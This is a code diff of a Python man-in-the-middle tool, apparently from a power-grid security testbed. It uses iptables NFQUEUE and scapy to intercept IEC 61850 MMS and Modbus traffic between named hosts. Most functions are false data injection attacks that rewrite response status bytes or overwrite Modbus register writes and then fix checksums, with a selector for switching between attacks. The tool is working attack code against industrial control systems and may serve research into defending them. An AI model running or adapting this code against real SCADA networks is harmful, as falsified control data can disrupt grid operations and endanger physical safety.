@@ -4,7 +4,6 @@ from netfilterqueue import NetfilterQueue
 import os
 from utils_modified import *
 iptablesr1 = "iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 0"
-#iptablesr2 = "iptables -A INPUT -s 172.18.5.59 -d 172.16.4.41 -j NFQUEUE --queue-num 0"
 from scapy.contrib.modbus import * 
 
 import struct
@@ -23,9 +22,7 @@ def callback(payload):
     #print ("callback")
     data = payload.get_payload()
     pkt = IP(data)
-    #pkt.show()
     finalpkt = handle_received_packets(pkt)
-    #payload.set_verdict(nfqueue.NF_ACCEPT, str(finalpkt), len(finalpkt))
     print("callback:")
     try:
         hexdump(finalpkt)
@@ -56,7 +53,6 @@ def fdia1(pkt):
        (pkt["IP"].src == "172.16.4.41"  and pkt["IP"].dst == "172.18.5.60")): 
         print ("---------------------------------------------------------------------------------------")
         print(pkt['IP'].src, pkt['IP'].dst)
-        result = check_mms(pkt) 
         print (result)                 
         try:
             if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
@@ -84,39 +80,6 @@ def fdia1(pkt):
     return pkt
 
 def fdia2(pkt):
-    global lastestTargetInvokedId
-    if ((pkt["IP"].src == "172.16.4.41"  and pkt["IP"].dst == "172.16.3.12") or 
-       (pkt["IP"].src == "172.16.3.12"  and pkt["IP"].dst == "172.16.4.41")): 
-        print ("---------------------------------------------------------------------------------------")
-        print(pkt['IP'].src, pkt['IP'].dst)
-        result = check_mms(pkt) 
-        print (result)                 
-        try:
-            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
-                if result["isrequest"] == True:
-                    #print ("print ----")
-                    lastestTargetInvokedKey = str(result["querykey"])
-                    if  "GGIO1$ST$Ind3$stVal" in lastestTargetInvokedKey and "MIED2CTRL" in str(result["datafield"]):
-                        lastestTargetInvokedId = result["invokeid"]
-                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
-                elif lastestTargetInvokedId == result["invokeid"]:
-                    print ("find the correct response")
-                    final_pkt = pkt.copy() 
-                    payload = final_pkt["Raw"]
-                    if payload is not None:
-                        print("Before:")
-                        hexdump(final_pkt)
-                        final_pkt["Raw"].load = payload.load[:-1] + b'\x00'  
-                        del final_pkt[IP].chksum
-                        del final_pkt[TCP].chksum
-                        print("After:")
-                        hexdump(final_pkt)
-                    return final_pkt
-        except Exception as e:
-            return pkt
-    return pkt 
-
-def fdia2_2(pkt):
     global lastestTargetInvokedId
     if ((pkt["IP"].src == "172.18.5.60"  and pkt["IP"].dst == "172.16.3.12") or 
        (pkt["IP"].src == "172.16.3.12"  and pkt["IP"].dst == "172.18.5.60")): 
@@ -178,8 +141,6 @@ def fdia3(pkt):
                         print("Before:")
                         hexdump(final_pkt)
                         final_pkt["Raw"].load = payload.load[:-1] + b'\x00'
-                        #final_pkt.lastlayer().load = payload.load[:-103] + b'\xff\xff\xff\xff\xff'+payload.load[-98:-96]+ b'\xff\xff\xff\xff\xff'+payload.load[-91:-89] + b'\xff\xff\xff\xff\xff'+payload.load[-84:]
-                        #final_pkt.payload = payload
                         del final_pkt[IP].chksum
                         del final_pkt[TCP].chksum
                         print("After:")
@@ -211,8 +172,6 @@ def fdia3(pkt):
                         print("Before:")
                         hexdump(final_pkt)
                         final_pkt["Raw"].load = payload.load[:-1] + b'\x00'
-                        #final_pkt.lastlayer().load = payload.load[:-103] + b'\xff\xff\xff\xff\xff'+payload.load[-98:-96]+ b'\xff\xff\xff\xff\xff'+payload.load[-91:-89] + b'\xff\xff\xff\xff\xff'+payload.load[-84:]
-                        #final_pkt.payload = payload
                         del final_pkt[IP].chksum
                         del final_pkt[TCP].chksum
                         print("After:")
@@ -249,8 +208,6 @@ def fdia4_1(pkt):
                         print("Before:")
                         hexdump(final_pkt)
                         final_pkt["Raw"].load = payload.load[:-1] + b'\x01'
-                        #final_pkt.lastlayer().load = payload.load[:-103] + b'\xff\xff\xff\xff\xff'+payload.load[-98:-96]+ b'\xff\xff\xff\xff\xff'+payload.load[-91:-89] + b'\xff\xff\xff\xff\xff'+payload.load[-84:]
-                        #final_pkt.payload = payload
                         del final_pkt[IP].chksum
                         del final_pkt[TCP].chksum
                         print("After:")
@@ -261,6 +218,23 @@ def fdia4_1(pkt):
     return pkt
 
 #for fdia4, run fdia4_1 first to set GEN1_P_Negative to True and then run this 
+def fdia4_2(pkt):
+    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.5.11") or 
+       (pkt["IP"].src == "172.16.5.11" and pkt["IP"].dst == "172.16.4.41")): 
+        print ("---------------------------------------------------------------------------------------")
+        print(pkt['IP'].src, pkt['IP'].dst)
+        final_pkt = pkt.copy()
+        del final_pkt[IP].chksum
+        del final_pkt[TCP].chksum
+        if final_pkt.haslayer("ModbusPDU10WriteMultipleRegistersRequest"):
+           print("Before:")
+           hexdump(final_pkt)
+           final_pkt["ModbusPDU10WriteMultipleRegistersRequest"].outputsValue = [0x0106, 0x1d4c]
+           print("After:")
+           hexdump(final_pkt)
+           return final_pkt
+    return pkt
+
 def tda2(pkt):
     if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.5.11") or 
        (pkt["IP"].src == "172.16.5.11" and pkt["IP"].dst == "172.16.4.41")): 
@@ -276,57 +250,9 @@ def tda2(pkt):
            print("After:")
            hexdump(final_pkt)
            return final_pkt
-    #elif ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.5.12") or 
-    #   (pkt["IP"].src == "172.16.5.12" and pkt["IP"].dst == "172.16.4.41")): 
-    #    print ("---------------------------------------------------------------------------------------")
-    #    print(pkt['IP'].src, pkt['IP'].dst)
-    #    final_pkt = pkt.copy()
-    #    del final_pkt[IP].chksum
-    #    del final_pkt[TCP].chksum
-    #    if final_pkt.haslayer("ModbusPDU10WriteMultipleRegistersRequest"):
-    #       print("Before:")
-    #       hexdump(final_pkt)
-    #       final_pkt["ModbusPDU10WriteMultipleRegistersRequest"].outputsValue = [0x0106, 0x1d4d]
-    #       print("After:")
-    #       hexdump(final_pkt)
-    #       return final_pkt
     return pkt
 
-#part1: forcing SCADA_PART_F_G2_Trigger == True
-#def fdia5_1(pkt):
-#    global lastestTargetInvokedId
-#    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.18.5.60") or 
-#       (pkt["IP"].src == "172.18.5.60" and pkt["IP"].dst == "172.16.4.41")): 
-#        print ("---------------------------------------------------------------------------------------")
-#        print(pkt['IP'].src, pkt['IP'].dst)
-#        result = check_mms(pkt) 
-#        print (result)                 
-#        try:
-#            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
-#                if result["isrequest"] == True:
-#                    #print ("print ----")
-#                    lastestTargetInvokedKey = str(result["querykey"])
-#                    if  "GGIO25$CO$SPCSO$Oper" in str(result["datafield"]): #and "ServerLogicalDevice" in str(result["datafield"]):
-#                        lastestTargetInvokedId = result["invokeid"]
-#                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
-#                        final_pkt = pkt.copy()
-#                        payload = final_pkt["Raw"]
-#                        print("Before:")
-#                        hexdump(final_pkt)
-#                        dataoffset = -100
-#                        final_pkt["Raw"].load = payload.load[:dataoffset] + b'\x01' + payload.load[dataoffset+1:]
-#                        del final_pkt[IP].chksum
-#                        del final_pkt[TCP].chksum
-#                        print("After:")
-#                        hexdump(final_pkt)
-#                        return final_pkt
-#                elif lastestTargetInvokedId == result["invokeid"]:
-#                    return pkt
-#        except Exception as e:
-#            return pkt
-#    return pkt
 
-#requires fdia5_1 to be done first
 def fdia5(pkt):
     global lastestTargetInvokedId
     if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.18.5.60") or 
@@ -340,7 +266,7 @@ def fdia5(pkt):
                 if result["isrequest"] == True:
                     #print ("print ----")
                     lastestTargetInvokedKey = str(result["querykey"])
-                    if  "GGIO24$SV$AnIn1$subMag$f" in str(result["datafield"]): #and "ServerLogicalDevice" in str(result["datafield"]):
+                    if  "GGIO24$SV$AnIn1$subMag$f" in str(result["datafield"]):
                         lastestTargetInvokedId = result["invokeid"]
                         print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
                         final_pkt = pkt.copy()
@@ -369,19 +295,15 @@ def handle_received_packets(pkt):
     global lastestTargetInvokedId
 
     final_pkt = pkt
-    #print(bytes(final_pkt))
-    #pkt.show()
     print ("-----------------------------------------------------")
     try:
-        #if ((pkt["IP"].src == "172.16.3.12"  and pkt["IP"].dst == "172.16.4.41") or 
-        #(pkt["IP"].src == "172.16.4.41"  and pkt["IP"].dst == "172.16.3.12")):
-        #    print(pkt['IP'].src, pkt['IP'].dst)
+        #comment out attack to carry out and comment everything else
         if final_pkt.haslayer("TCP"):
             final_pkt = fdia1(pkt)
             #final_pkt = fdia2(pkt)
-            #final_pkt = fdia2_2(pkt)
             #final_pkt = tda1(pkt)
             #final_pkt = fdia4_1(pkt)
+            #final_pjt = fdia4_2(pkt)
             #final_pkt = fdia3(pkt)
             #final_pkt = tda2(pkt)
             #final_pkt = fdia5(pkt)
@@ -408,5 +330,3 @@ def main():
         sys.exit('closing...')
 main()
 
-#sniff(iface=["enp0s10", "enp0s8"],filter='inbound', store=1, prn=handle_received_packets)
-#sniff(offline="/home/ruddymondal/Downloads/workstuff/testing_pcaps/participation_factor.pcapng", store=0, prn=handle_received_packets)
